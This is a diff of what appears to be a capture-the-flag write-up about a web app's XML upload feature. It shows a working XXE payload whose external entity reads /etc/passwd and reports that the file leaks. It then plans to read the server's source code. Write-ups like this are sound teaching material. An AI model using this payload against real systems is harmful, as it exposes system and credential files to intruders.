@@ -143,10 +143,48 @@ Time to check the upload function
 I uploaded a random file and i got this
 ![image](https://user-images.githubusercontent.com/113513376/221324899-e81e985a-1f25-4c37-9656-369123354b5f.png)
 
-Hmm it seems it requires an xml file with the format 
+Hmm it seems it requires an xml file with the article format  
 
 ```
-Example DescriptionExample Markdown
+ Title Description Markdown
 ```
 
+I created an xml file with those values needed [Resource](https://www.w3schools.com/xml/)
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<article>
+  <title>Learn Pwn</title>
+  <description>Lol</description>
+  <markdown>`hehe`</markdown>
+</article>
+```
+
+After i uploaded it i got the content of tags 
+![image](https://user-images.githubusercontent.com/113513376/221326190-2ad801f7-c715-4408-8647-8042e65ed198.png)
+
+With this, we can leverage this to read local file via XXE
+
+Since it will show the content of what's in the tag 
+
+Here's the resouce i got the payload [HackTricks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+<!ELEMENT title ANY>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<article>
+  <title>&file;</title>
+  <description>Lol</description>
+  <markdown>`hehe`</markdown>
+</article>
+```
+
+Uploading that leaks the `/etc/passwd` file
+![image](https://user-images.githubusercontent.com/113513376/221326390-99f28637-b05f-42f7-ae0d-cded719c698a.png)
+![image](https://user-images.githubusercontent.com/113513376/221326415-0f26039c-df4c-4dfb-8ee7-f205e931241a.png)
+
+Since we previously leaked the path of the web server and we know that its a nodejs web server, lets read its source code
 
